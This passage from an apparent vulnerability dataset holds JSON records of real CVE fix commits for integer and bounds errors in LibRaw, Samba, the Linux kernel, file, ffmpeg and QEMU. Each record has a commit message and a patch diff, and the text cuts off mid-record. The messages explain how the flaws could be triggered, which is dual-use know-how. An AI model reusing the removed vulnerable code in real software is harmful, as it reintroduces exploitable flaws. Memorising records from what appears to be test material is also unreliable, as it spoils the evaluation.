\"libraw\/libraw.h\"\n #include \"internal\/defines.h\"\n #include \"internal\/var_defines.h\"\n+#line 272 \"dcraw\/dcraw.c\"\n int CLASS fcol (int row, int col)\n {\n   static const char filter[16][16] =\n@@ -75,6 +77,7 @@ char *my_strcasestr (char *haystack, const char *needle)\n }\n #define strcasestr my_strcasestr\n #endif\n+#line 340 \"dcraw\/dcraw.c\"\n ushort CLASS sget2 (uchar *s)\n {\n   if (order == 0x4949)\t\t\/* \"II\" means little-endian *\/\n@@ -564,10 +567,12 @@ void CLASS canon_load_raw()\n #endif\n   FORC(2) free (huff[c]);\n }\n+#line 841 \"dcraw\/dcraw.c\"\n \n int CLASS ljpeg_start (struct jhead *jh, int info_only)\n {\n-  int c, tag, len;\n+  int c, tag;\n+  ushort len;\n   uchar data[0x10000];\n   const uchar *dp;\n \n@@ -1153,6 +1158,7 @@ int CLASS minolta_z2()\n     if (tail[i]) nz++;\n   return nz > 20;\n }\n+#line 1436 \"dcraw\/dcraw.c\"\n void CLASS ppm_thumb()\n {\n   char *thumb;\n@@ -2976,6 +2982,7 @@ void CLASS redcine_load_raw()\n #endif\n #endif\n }\n+#line 3983 \"dcraw\/dcraw.c\"\n void CLASS crop_masked_pixels()\n {\n   int row, col;\n@@ -3081,6 +3088,7 @@ void CLASS remove_zeroes()\n   RUN_CALLBACK(LIBRAW_PROGRESS_REMOVE_ZEROES,1,2);\n #endif\n }\n+#line 4254 \"dcraw\/dcraw.c\"\n void CLASS gamma_curve (double pwr, double ts, int mode, int imax)\n {\n   int i;\n@@ -4790,6 +4798,7 @@ void CLASS parse_thumb_note (int base, unsigned toff, unsigned tlen)\n     fseek (ifp, save, SEEK_SET);\n   }\n }\n+#line 5968 \"dcraw\/dcraw.c\"\n void CLASS parse_makernote (int base, int uptag)\n {\n   static const uchar xlat[2][256] = {\n@@ -5349,6 +5358,7 @@ void CLASS parse_kodak_ifd (int base)\n     fseek (ifp, save, SEEK_SET);\n   }\n }\n+#line 6533 \"dcraw\/dcraw.c\"\n int CLASS parse_tiff_ifd (int base)\n {\n   unsigned entries, tag, type, len, plen=16, save;\n@@ -6648,6 +6658,7 @@ void CLASS parse_redcine()\n     data_offset = get4();\n   }\n }\n+#line 7936 \"dcraw\/dcraw.c\"\n \n \/*\n    All matrices are from Adobe DNG Converter unless otherwise noted.\n@@ -8923,6 +8934,7 @@ void CLASS identify()\n }\n \n \n+#line 10303 \"dcraw\/dcraw.c\"\n void CLASS convert_to_rgb()\n {\n #ifndef LIBRAW_LIBRARY_BUILD\n@@ -9153,6 +9165,7 @@ int CLASS flip_index (int row, int col)\n   if (flip & 1) col = iwidth  - 1 - col;\n   return row * iwidth + col;\n }\n+#line 10559 \"dcraw\/dcraw.c\"\n void CLASS tiff_set (ushort *ntag,\n \tushort tag, ushort type, int count, int val)\n {\ndiff --git a\/internal\/dcraw_fileio.cpp b\/internal\/dcraw_fileio.cpp\nindex f099eeea..06933de4 100644\n--- a\/internal\/dcraw_fileio.cpp\n+++ b\/internal\/dcraw_fileio.cpp\n@@ -21,7 +21,7 @@ it under the terms of the one of three licenses as you choose:\n    for more information\n *\/\n \n-#line 4090 \"dcraw\/dcraw.c\"\n+#line 4091 \"dcraw\/dcraw.c\"\n #include <math.h>\n #define CLASS LibRaw::\n #include \"libraw\/libraw_types.h\"\n@@ -29,7 +29,7 @@ it under the terms of the one of three licenses as you choose:\n #include \"libraw\/libraw.h\"\n #include \"internal\/defines.h\"\n #include \"internal\/var_defines.h\"\n-#line 4101 \"dcraw\/dcraw.c\"\n+#line 4102 \"dcraw\/dcraw.c\"\n \/*\n    Seach from the current directory up to the root looking for\n    a \".badpixels\" file, and fix those pixels now.\n@@ -54,7 +54,7 @@ void CLASS bad_pixels (const char *cfname)\n #endif\n   if (cfname)\n     fp = fopen (cfname, \"r\");\n-#line 4151 \"dcraw\/dcraw.c\"\n+#line 4152 \"dcraw\/dcraw.c\"\n   if (!fp)\n       {\n #ifdef LIBRAW_LIBRARY_BUILD\n@@ -154,7 +154,7 @@ void CLASS subtract (const char *fname)\n   RUN_CALLBACK(LIBRAW_PROGRESS_DARK_FRAME,1,2);\n #endif\n }\n-#line 10213 \"dcraw\/dcraw.c\"\n+#line 10214 \"dcraw\/dcraw.c\"\n #ifndef NO_LCMS\n void CLASS apply_profile (const char *input, const char *output)\n {\ndiff --git a\/libraw\/libraw_version.h b\/libraw\/libraw_version.h\nindex 3594136f..030a477e 100644\n--- a\/libraw\/libraw_version.h\n+++ b\/libraw\/libraw_version.h\n@@ -25,7 +25,7 @@ it under the terms of the one of three licenses as you choose:\n \n #define LIBRAW_MAJOR_VERSION  0\n #define LIBRAW_MINOR_VERSION  16\n-#define LIBRAW_PATCH_VERSION  0\n+#define LIBRAW_PATCH_VERSION  1\n #define LIBRAW_VERSION_TAIL   Release\n \n #define LIBRAW_SHLIB_CURRENT  \t10\n","owner":"LibRaw","repo":"LibRaw","source":"cve"},{"CVE_ID":"CVE-2015-3223","CWE_ID":"189","category":"security","commit_id":"aa6c27148b9d3f8c1e4fdd5dd46bfecbbd0ca465","commit_message":"From aa6c27148b9d3f8c1e4fdd5dd46bfecbbd0ca465 Mon Sep 17 00:00:00 2001\nFrom: Jeremy Allison <jra@samba.org>\nDate: Tue, 9 Jun 2015 14:00:01 -0700\nSubject: [PATCH] CVE-2015-3223: lib: ldb: Use memmem binary search, not strstr\n text search.\n\nValues might have embedded zeros.\n\nBUG: https:\/\/bugzilla.samba.org\/show_bug.cgi?id=11325\n\nSigned-off-by: Jeremy Allison <jra@samba.org>\nReviewed-by: Ralph Boehme <slow@samba.org>\n---\n lib\/ldb\/common\/ldb_match.c | 17 +++++++++++++----\n 1 file changed, 13 insertions(+), 4 deletions(-)\n\n","diff_code":"diff --git a\/lib\/ldb\/common\/ldb_match.c b\/lib\/ldb\/common\/ldb_match.c\nindex 7414289b613..182c6ce5720 100644\n--- a\/lib\/ldb\/common\/ldb_match.c\n+++ b\/lib\/ldb\/common\/ldb_match.c\n@@ -241,7 +241,6 @@ static int ldb_wildcard_compare(struct ldb_context *ldb,\n \tstruct ldb_val val;\n \tstruct ldb_val cnk;\n \tstruct ldb_val *chunk;\n-\tchar *p, *g;\n \tuint8_t *save_p = NULL;\n \tunsigned int c = 0;\n \n@@ -288,6 +287,7 @@ static int ldb_wildcard_compare(struct ldb_context *ldb,\n \t}\n \n \twhile (tree->u.substring.chunks[c]) {\n+\t\tuint8_t *p;\n \n \t\tchunk = tree->u.substring.chunks[c];\n \t\tif(a->syntax->canonicalise_fn(ldb, ldb, chunk, &cnk) != 0) goto mismatch;\n@@ -299,15 +299,24 @@ static int ldb_wildcard_compare(struct ldb_context *ldb,\n \t\tif (cnk.length == 0) {\n \t\t\tgoto mismatch;\n \t\t}\n-\t\tp = strstr((char *)val.data, (char *)cnk.data);\n+\t\t\/*\n+\t\t * Values might be binary blobs. Don't use string\n+\t\t * search, but memory search instead.\n+\t\t *\/\n+\t\tp = memmem((const void *)val.data,val.length,\n+\t\t\t   (const void *)cnk.data, cnk.length);\n \t\tif (p == NULL) goto mismatch;\n \t\tif ( (! tree->u.substring.chunks[c + 1]) && (! tree->u.substring.end_with_wildcard) ) {\n+\t\t\tuint8_t *g;\n \t\t\tdo { \/* greedy *\/\n-\t\t\t\tg = strstr((char *)p + cnk.length, (char *)cnk.data);\n+\t\t\t\tg = memmem(p + cnk.length,\n+\t\t\t\t\tval.length - (p - val.data),\n+\t\t\t\t\t(const uint8_t *)cnk.data,\n+\t\t\t\t\tcnk.length);\n \t\t\t\tif (g) p = g;\n \t\t\t} while(g);\n \t\t}\n-\t\tval.length = val.length - (p - (char *)(val.data)) - cnk.length;\n+\t\tval.length = val.length - (p - (uint8_t *)(val.data)) - cnk.length;\n \t\tval.data = (uint8_t *)(p + cnk.length);\n \t\tc++;\n \t\ttalloc_free(cnk.data);\n-- \n2.17.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2009-0787","CWE_ID":"189","category":"security","commit_id":"8faece5f906725c10e7a1f6caf84452abadbdc7b","commit_message":"From 8faece5f906725c10e7a1f6caf84452abadbdc7b Mon Sep 17 00:00:00 2001\nFrom: Tyler Hicks <tyhicks@linux.vnet.ibm.com>\nDate: Fri, 20 Mar 2009 01:25:09 -0500\nSubject: eCryptfs: Allocate a variable number of pages for file headers\n\nWhen allocating the memory used to store the eCryptfs header contents, a\nsingle, zeroed page was being allocated with get_zeroed_page().\nHowever, the size of an eCryptfs header is either PAGE_CACHE_SIZE or\nECRYPTFS_MINIMUM_HEADER_EXTENT_SIZE (8192), whichever is larger, and is\nstored in the file's private_data->crypt_stat->num_header_bytes_at_front\nfield.\n\necryptfs_write_metadata_to_contents() was using\nnum_header_bytes_at_front to decide how many bytes should be written to\nthe lower filesystem for the file header.  Unfortunately, at least 8K\nwas being written from the page, despite the chance of the single,\nzeroed page being smaller than 8K.  This resulted in random areas of\nkernel memory being written between the 0x1000 and 0x1FFF bytes offsets\nin the eCryptfs file headers if PAGE_SIZE was 4K.\n\nThis patch allocates a variable number of pages, calculated with\nnum_header_bytes_at_front, and passes the number of allocated pages\nalong to ecryptfs_write_metadata_to_contents().\n\nThanks to Florian Streibelt for reporting the data leak and working with\nme to find the problem.  2.6.28 is the only kernel release with this\nvulnerability.  Corresponds to CVE-2009-0787\n\nSigned-off-by: Tyler Hicks <tyhicks@linux.vnet.ibm.com>\nAcked-by: Dustin Kirkland <kirkland@canonical.com>\nReviewed-by: Eric Sandeen <sandeen@redhat.com>\nReviewed-by: Eugene Teo <eugeneteo@kernel.sg>\nCc: Greg KH <greg@kroah.com>\nCc: dann frazier <dannf@dannf.org>\nCc: Serge E. Hallyn <serue@us.ibm.com>\nCc: Florian Streibelt <florian@f-streibelt.de>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/ecryptfs\/crypto.c | 39 ++++++++++++++++++++++++++-------------\n 1 file changed, 26 insertions(+), 13 deletions(-)\n\n","diff_code":"diff --git a\/fs\/ecryptfs\/crypto.c b\/fs\/ecryptfs\/crypto.c\nindex bdca1f4b3a3e..75bee99de0f6 100644\n--- a\/fs\/ecryptfs\/crypto.c\n+++ b\/fs\/ecryptfs\/crypto.c\n@@ -1324,14 +1324,13 @@ static int ecryptfs_write_headers_virt(char *page_virt, size_t max,\n }\n \n static int\n-ecryptfs_write_metadata_to_contents(struct ecryptfs_crypt_stat *crypt_stat,\n-\t\t\t\t    struct dentry *ecryptfs_dentry,\n-\t\t\t\t    char *virt)\n+ecryptfs_write_metadata_to_contents(struct dentry *ecryptfs_dentry,\n+\t\t\t\t    char *virt, size_t virt_len)\n {\n \tint rc;\n \n \trc = ecryptfs_write_lower(ecryptfs_dentry->d_inode, virt,\n-\t\t\t\t  0, crypt_stat->num_header_bytes_at_front);\n+\t\t\t\t  0, virt_len);\n \tif (rc)\n \t\tprintk(KERN_ERR \"%s: Error attempting to write header \"\n \t\t       \"information to lower file; rc = [%d]\\n\", __func__,\n@@ -1341,7 +1340,6 @@ ecryptfs_write_metadata_to_contents(struct ecryptfs_crypt_stat *crypt_stat,\n \n static int\n ecryptfs_write_metadata_to_xattr(struct dentry *ecryptfs_dentry,\n-\t\t\t\t struct ecryptfs_crypt_stat *crypt_stat,\n \t\t\t\t char *page_virt, size_t size)\n {\n \tint rc;\n@@ -1351,6 +1349,17 @@ ecryptfs_write_metadata_to_xattr(struct dentry *ecryptfs_dentry,\n \treturn rc;\n }\n \n+static unsigned long ecryptfs_get_zeroed_pages(gfp_t gfp_mask,\n+\t\t\t\t\t       unsigned int order)\n+{\n+\tstruct page *page;\n+\n+\tpage = alloc_pages(gfp_mask | __GFP_ZERO, order);\n+\tif (page)\n+\t\treturn (unsigned long) page_address(page);\n+\treturn 0;\n+}\n+\n \/**\n  * ecryptfs_write_metadata\n  * @ecryptfs_dentry: The eCryptfs dentry\n@@ -1367,7 +1376,9 @@ int ecryptfs_write_metadata(struct dentry *ecryptfs_dentry)\n {\n \tstruct ecryptfs_crypt_stat *crypt_stat =\n \t\t&ecryptfs_inode_to_private(ecryptfs_dentry->d_inode)->crypt_stat;\n+\tunsigned int order;\n \tchar *virt;\n+\tsize_t virt_len;\n \tsize_t size = 0;\n \tint rc = 0;\n \n@@ -1383,33 +1394,35 @@ int ecryptfs_write_metadata(struct dentry *ecryptfs_dentry)\n \t\trc = -EINVAL;\n \t\tgoto out;\n \t}\n+\tvirt_len = crypt_stat->num_header_bytes_at_front;\n+\torder = get_order(virt_len);\n \t\/* Released in this function *\/\n-\tvirt = (char *)get_zeroed_page(GFP_KERNEL);\n+\tvirt = (char *)ecryptfs_get_zeroed_pages(GFP_KERNEL, order);\n \tif (!virt) {\n \t\tprintk(KERN_ERR \"%s: Out of memory\\n\", __func__);\n \t\trc = -ENOMEM;\n \t\tgoto out;\n \t}\n-\trc = ecryptfs_write_headers_virt(virt, PAGE_CACHE_SIZE, &size,\n-\t\t\t\t\t crypt_stat, ecryptfs_dentry);\n+\trc = ecryptfs_write_headers_virt(virt, virt_len, &size, crypt_stat,\n+\t\t\t\t\t ecryptfs_dentry);\n \tif (unlikely(rc)) {\n \t\tprintk(KERN_ERR \"%s: Error whilst writing headers; rc = [%d]\\n\",\n \t\t       __func__, rc);\n \t\tgoto out_free;\n \t}\n \tif (crypt_stat->flags & ECRYPTFS_METADATA_IN_XATTR)\n-\t\trc = ecryptfs_write_metadata_to_xattr(ecryptfs_dentry,\n-\t\t\t\t\t\t      crypt_stat, virt, size);\n+\t\trc = ecryptfs_write_metadata_to_xattr(ecryptfs_dentry, virt,\n+\t\t\t\t\t\t      size);\n \telse\n-\t\trc = ecryptfs_write_metadata_to_contents(crypt_stat,\n-\t\t\t\t\t\t\t ecryptfs_dentry, virt);\n+\t\trc = ecryptfs_write_metadata_to_contents(ecryptfs_dentry, virt,\n+\t\t\t\t\t\t\t virt_len);\n \tif (rc) {\n \t\tprintk(KERN_ERR \"%s: Error writing metadata out to lower file; \"\n \t\t       \"rc = [%d]\\n\", __func__, rc);\n \t\tgoto out_free;\n \t}\n out_free:\n-\tfree_page((unsigned long)virt);\n+\tfree_pages((unsigned long)virt, order);\n out:\n \treturn rc;\n }\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-3587","CWE_ID":"189","category":"security","commit_id":"0641e56be1af003aa02c7c6b0184466540637233","commit_message":"From 0641e56be1af003aa02c7c6b0184466540637233 Mon Sep 17 00:00:00 2001\nFrom: Christos Zoulas <christos@zoulas.com>\nDate: Thu, 7 Aug 2014 09:38:35 +0000\nSubject: [PATCH] Prevent wrap around (Remi Collet at redhat)\n\n---\n src\/cdf.c | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/src\/cdf.c b\/src\/cdf.c\nindex 5dbf3b13e..3e691f4c6 100644\n--- a\/src\/cdf.c\n+++ b\/src\/cdf.c\n@@ -35,7 +35,7 @@\n #include \"file.h\"\n \n #ifndef lint\n-FILE_RCSID(\"@(#)$File: cdf.c,v 1.63 2014\/06\/09 13:04:37 christos Exp $\")\n+FILE_RCSID(\"@(#)$File: cdf.c,v 1.64 2014\/07\/24 19:35:39 christos Exp $\")\n #endif\n \n #include <assert.h>\n@@ -835,6 +835,10 @@ cdf_read_property_info(const cdf_stream_t *sst, const cdf_header_t *h,\n \t\tq = (const uint8_t *)(const void *)\n \t\t    ((const char *)(const void *)p + ofs\n \t\t    - 2 * sizeof(uint32_t));\n+\t\tif (q < p) {\n+\t\t\tDPRINTF((\"Wrapped around %p < %p\\n\", q, p));\n+\t\t\tgoto out;\n+\t\t}\n \t\tif (q > e) {\n \t\t\tDPRINTF((\"Ran of the end %p > %p\\n\", q, e));\n \t\t\tgoto out;\n","owner":"file","repo":"file","source":"cve"},{"CVE_ID":"CVE-2011-1745","CWE_ID":"189","category":"security","commit_id":"194b3da873fd334ef183806db751473512af29ce","commit_message":"From 194b3da873fd334ef183806db751473512af29ce Mon Sep 17 00:00:00 2001\nFrom: Vasiliy Kulikov <segoon@openwall.com>\nDate: Thu, 14 Apr 2011 20:55:16 +0400\nSubject: agp: fix arbitrary kernel memory writes\n\npg_start is copied from userspace on AGPIOC_BIND and AGPIOC_UNBIND ioctl\ncmds of agp_ioctl() and passed to agpioc_bind_wrap().  As said in the\ncomment, (pg_start + mem->page_count) may wrap in case of AGPIOC_BIND,\nand it is not checked at all in case of AGPIOC_UNBIND.  As a result, user\nwith sufficient privileges (usually \"video\" group) may generate either\nlocal DoS or privilege escalation.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>\n---\n drivers\/char\/agp\/generic.c | 11 ++++++++---\n 1 file changed, 8 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/char\/agp\/generic.c b\/drivers\/char\/agp\/generic.c\nindex 850a643ad694..b072648dc3f6 100644\n--- a\/drivers\/char\/agp\/generic.c\n+++ b\/drivers\/char\/agp\/generic.c\n@@ -1095,8 +1095,8 @@ int agp_generic_insert_memory(struct agp_memory * mem, off_t pg_start, int type)\n \t\treturn -EINVAL;\n \t}\n \n-\t\/* AK: could wrap *\/\n-\tif ((pg_start + mem->page_count) > num_entries)\n+\tif (((pg_start + mem->page_count) > num_entries) ||\n+\t    ((pg_start + mem->page_count) < pg_start))\n \t\treturn -EINVAL;\n \n \tj = pg_start;\n@@ -1130,7 +1130,7 @@ int agp_generic_remove_memory(struct agp_memory *mem, off_t pg_start, int type)\n {\n \tsize_t i;\n \tstruct agp_bridge_data *bridge;\n-\tint mask_type;\n+\tint mask_type, num_entries;\n \n \tbridge = mem->bridge;\n \tif (!bridge)\n@@ -1142,6 +1142,11 @@ int agp_generic_remove_memory(struct agp_memory *mem, off_t pg_start, int type)\n \tif (type != mem->type)\n \t\treturn -EINVAL;\n \n+\tnum_entries = agp_num_entries();\n+\tif (((pg_start + mem->page_count) > num_entries) ||\n+\t    ((pg_start + mem->page_count) < pg_start))\n+\t\treturn -EINVAL;\n+\n \tmask_type = bridge->driver->agp_type_to_mask_type(bridge, type);\n \tif (mask_type != 0) {\n \t\t\/* The generic routines know nothing of memory types *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-4160","CWE_ID":"189","category":"security","commit_id":"8acfe468b0384e834a303f08ebc4953d72fb690a","commit_message":"From 8acfe468b0384e834a303f08ebc4953d72fb690a Mon Sep 17 00:00:00 2001\nFrom: \"David S. Miller\" <davem@davemloft.net>\nDate: Thu, 28 Oct 2010 11:41:55 -0700\nSubject: net: Limit socket I\/O iovec total length to INT_MAX.\n\nThis helps protect us from overflow issues down in the\nindividual protocol sendmsg\/recvmsg handlers.  Once\nwe hit INT_MAX we truncate out the rest of the iovec\nby setting the iov_len members to zero.\n\nThis works because:\n\n1) For SOCK_STREAM and SOCK_SEQPACKET sockets, partial\n   writes are allowed and the application will just continue\n   with another write to send the rest of the data.\n\n2) For datagram oriented sockets, where there must be a\n   one-to-one correspondance between write() calls and\n   packets on the wire, INT_MAX is going to be far larger\n   than the packet size limit the protocol is going to\n   check for and signal with -EMSGSIZE.\n\nBased upon a patch by Linus Torvalds.\n\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n include\/linux\/socket.h |  2 +-\n net\/compat.c           | 10 ++++++----\n net\/core\/iovec.c       | 20 +++++++++-----------\n 3 files changed, 16 insertions(+), 16 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/socket.h b\/include\/linux\/socket.h\nindex 5146b50202ce..86b652fabf6e 100644\n--- a\/include\/linux\/socket.h\n+++ b\/include\/linux\/socket.h\n@@ -322,7 +322,7 @@ extern int csum_partial_copy_fromiovecend(unsigned char *kdata,\n \t\t\t\t\t  int offset, \n \t\t\t\t\t  unsigned int len, __wsum *csump);\n \n-extern long verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address, int mode);\n+extern int verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address, int mode);\n extern int memcpy_toiovec(struct iovec *v, unsigned char *kdata, int len);\n extern int memcpy_toiovecend(const struct iovec *v, unsigned char *kdata,\n \t\t\t     int offset, int len);\ndiff --git a\/net\/compat.c b\/net\/compat.c\nindex 63d260e81472..3649d5895361 100644\n--- a\/net\/compat.c\n+++ b\/net\/compat.c\n@@ -41,10 +41,12 @@ static inline int iov_from_user_compat_to_kern(struct iovec *kiov,\n \t\tcompat_size_t len;\n \n \t\tif (get_user(len, &uiov32->iov_len) ||\n-\t\t   get_user(buf, &uiov32->iov_base)) {\n-\t\t\ttot_len = -EFAULT;\n-\t\t\tbreak;\n-\t\t}\n+\t\t    get_user(buf, &uiov32->iov_base))\n+\t\t\treturn -EFAULT;\n+\n+\t\tif (len > INT_MAX - tot_len)\n+\t\t\tlen = INT_MAX - tot_len;\n+\n \t\ttot_len += len;\n \t\tkiov->iov_base = compat_ptr(buf);\n \t\tkiov->iov_len = (__kernel_size_t) len;\ndiff --git a\/net\/core\/iovec.c b\/net\/core\/iovec.c\nindex 72aceb1fe4fa..c40f27e7d208 100644\n--- a\/net\/core\/iovec.c\n+++ b\/net\/core\/iovec.c\n@@ -35,10 +35,9 @@\n  *\tin any case.\n  *\/\n \n-long verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address, int mode)\n+int verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address, int mode)\n {\n-\tint size, ct;\n-\tlong err;\n+\tint size, ct, err;\n \n \tif (m->msg_namelen) {\n \t\tif (mode == VERIFY_READ) {\n@@ -62,14 +61,13 @@ long verify_iovec(struct msghdr *m, struct iovec *iov, struct sockaddr *address,\n \terr = 0;\n \n \tfor (ct = 0; ct < m->msg_iovlen; ct++) {\n-\t\terr += iov[ct].iov_len;\n-\t\t\/*\n-\t\t * Goal is not to verify user data, but to prevent returning\n-\t\t * negative value, which is interpreted as errno.\n-\t\t * Overflow is still possible, but it is harmless.\n-\t\t *\/\n-\t\tif (err < 0)\n-\t\t\treturn -EMSGSIZE;\n+\t\tsize_t len = iov[ct].iov_len;\n+\n+\t\tif (len > INT_MAX - err) {\n+\t\t\tlen = INT_MAX - err;\n+\t\t\tiov[ct].iov_len = len;\n+\t\t}\n+\t\terr += len;\n \t}\n \n \treturn err;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-2906","CWE_ID":"189","category":"security","commit_id":"b5b515445f4f5a905c5dd27e6e682868ccd6c09d","commit_message":"From b5b515445f4f5a905c5dd27e6e682868ccd6c09d Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Mon, 11 Jul 2011 14:08:23 -0700\nSubject: [SCSI] pmcraid: reject negative request size\n\nThere's a code path in pmcraid that can be reached via device ioctl that\ncauses all sorts of ugliness, including heap corruption or triggering the\nOOM killer due to consecutive allocation of large numbers of pages.\n\nFirst, the user can call pmcraid_chr_ioctl(), with a type\nPMCRAID_PASSTHROUGH_IOCTL.  This calls through to\npmcraid_ioctl_passthrough().  Next, a pmcraid_passthrough_ioctl_buffer\nis copied in, and the request_size variable is set to\nbuffer->ioarcb.data_transfer_length, which is an arbitrary 32-bit\nsigned value provided by the user.  If a negative value is provided\nhere, bad things can happen.  For example,\npmcraid_build_passthrough_ioadls() is called with this request_size,\nwhich immediately calls pmcraid_alloc_sglist() with a negative size.\nThe resulting math on allocating a scatter list can result in an\noverflow in the kzalloc() call (if num_elem is 0, the sglist will be\nsmaller than expected), or if num_elem is unexpectedly large the\nsubsequent loop will call alloc_pages() repeatedly, a high number of\npages will be allocated and the OOM killer might be invoked.\n\nIt looks like preventing this value from being negative in\npmcraid_ioctl_passthrough() would be sufficient.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: James Bottomley <JBottomley@Parallels.com>\n---\n drivers\/scsi\/pmcraid.c | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/drivers\/scsi\/pmcraid.c b\/drivers\/scsi\/pmcraid.c\nindex fca6a8953070..d079f9a3c6b3 100644\n--- a\/drivers\/scsi\/pmcraid.c\n+++ b\/drivers\/scsi\/pmcraid.c\n@@ -3871,6 +3871,9 @@ static long pmcraid_ioctl_passthrough(\n \t\t\tpmcraid_err(\"couldn't build passthrough ioadls\\n\");\n \t\t\tgoto out_free_buffer;\n \t\t}\n+\t} else if (request_size < 0) {\n+\t\trc = -EINVAL;\n+\t\tgoto out_free_buffer;\n \t}\n \n \t\/* If data is being written into the device, copy the data from user\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-9602","CWE_ID":"189","category":"security","commit_id":"93a5a16f136d095d23610f57bdad10ba88120fba","commit_message":"From 93a5a16f136d095d23610f57bdad10ba88120fba Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michaelni@gmx.at>\nDate: Tue, 16 Dec 2014 18:57:54 +0100\nSubject: [PATCH] avcodec\/xface: correct the XFACE_MAX_* values\n\nFixes out of array access\n\nFixes: asan_stack-oob_32c12e5_2536_cov_2442316831_lena.xface\nFound-by: Mateusz \"j00ru\" Jurczyk and Gynvael Coldwind\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>\n---\n libavcodec\/xface.h | 10 +++++-----\n 1 file changed, 5 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/libavcodec\/xface.h b\/libavcodec\/xface.h\nindex 63df5d3308..0236d713ad 100644\n--- a\/libavcodec\/xface.h\n+++ b\/libavcodec\/xface.h\n@@ -41,17 +41,17 @@\n \/*\n  * Image is encoded as a big integer, using characters from '~' to\n  * '!', for a total of 94 symbols. In order to express\n- * 48x48*2=8*XFACE_MAX_WORDS=4608\n- * bits, we need a total of 704 digits, as given by:\n- * ceil(lg_94(2^4608)) = 704\n+ * 48x48 pixels with the worst case encoding 666 symbols should\n+ * be sufficient.\n  *\/\n-#define XFACE_MAX_DIGITS 704\n+#define XFACE_MAX_DIGITS 666\n \n #define XFACE_BITSPERWORD 8\n #define XFACE_WORDCARRY (1 << XFACE_BITSPERWORD)\n #define XFACE_WORDMASK (XFACE_WORDCARRY - 1)\n \n-#define XFACE_MAX_WORDS ((XFACE_PIXELS * 2 + XFACE_BITSPERWORD - 1) \/ XFACE_BITSPERWORD)\n+\/\/ This must be larger or equal to log256(94^XFACE_MAX_DIGITS)\n+#define XFACE_MAX_WORDS 546\n \n \/* Portable, very large unsigned integer arithmetic is needed.\n  * Implementation uses arrays of WORDs. *\/\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2015-8504","CWE_ID":"189","category":"security","commit_id":"4c65fed8bdf96780735dbdb92a8bd0d6b6526cc3","commit_message":"From 4c65fed8bdf96780735dbdb92a8bd0d6b6526cc3 Mon Sep 17 00:00:00 2001\nFrom: Prasad J Pandit <pjp@fedoraproject.org>\nDate: Thu, 3 Dec 2015 18:54:17 +0530\nSubject: [PATCH] ui: vnc: avoid floating point exception\n\nWhile sending 'SetPixelFormat' messages to a VNC server,\nthe client could set the 'red-max', 'green-max' and 'blue-max'\nvalues to be zero. This leads to a floating point exception in\nwrite_png_palette while doing frame buffer updates.\n\nReported-by: Lian Yihan <lianyihan@360.cn>\nSigned-off-by: Prasad J Pandit <pjp@fedoraproject.org>\nReviewed-by: Gerd Hoffmann <kraxel@redhat.com>\nSigned-off-by: Peter Maydell <peter.maydell@linaro.org>\n---\n ui\/vnc.c | 6 +++---\n 1 file changed, 3 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/ui\/vnc.c b\/ui\/vnc.c\nindex 7538405..cbe4d33 100644\n--- a\/ui\/vnc.c\n+++ b\/ui\/vnc.c\n@@ -2198,15 +2198,15 @@ static void set_pixel_format(VncState *vs,\n         return;\n     }\n \n-    vs->client_pf.rmax = red_max;\n+    vs->client_pf.rmax = red_max ? red_max : 0xFF;\n     vs->client_pf.rbits = hweight_long(red_max);\n     vs->client_pf.rshift = red_shift;\n     vs->client_pf.rmask = red_max << red_shift;\n-    vs->client_pf.gmax = green_max;\n+    vs->client_pf.gmax = green_max ? green_max : 0xFF;\n     vs->client_pf.gbits = hweight_long(green_max);\n     vs->client_pf.gshift = green_shift;\n     vs->client_pf.gmask = green_max << green_shift;\n-    vs->client_pf.bmax = blue_max;\n+    vs->client_pf.bmax = blue_max ? blue_max : 0xFF;\n     vs->client_pf.bbits = hweight_long(blue_max);\n     vs->client_pf.bshift = blue_shift;\n     vs->client_pf.bmask = blue_max << blue_shift;\n-- \n1.8.3.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-2100","CWE_ID":"189","category":"security","commit_id":"d50f2ab6f050311dbf7b8f5501b25f0bf64a439b","commit_message":"From d50f2ab6f050311dbf7b8f5501b25f0bf64a439b Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Tue, 10 Jan 2012 11:51:10 -0500\nSubject: ext4: fix undefined behavior in ext4_fill_flex_info()\n\nCommit 503358ae01b70ce6909d19dd01287093f6b6271c (\"ext4: avoid divide by\nzero when trying to mount a corrupted file system\") fixes CVE-2009-4307\nby performing a sanity check on s_log_groups_per_flex, since it can be\nset to a bogus value by an attacker.\n\n\tsbi->s_log_groups_per_flex = 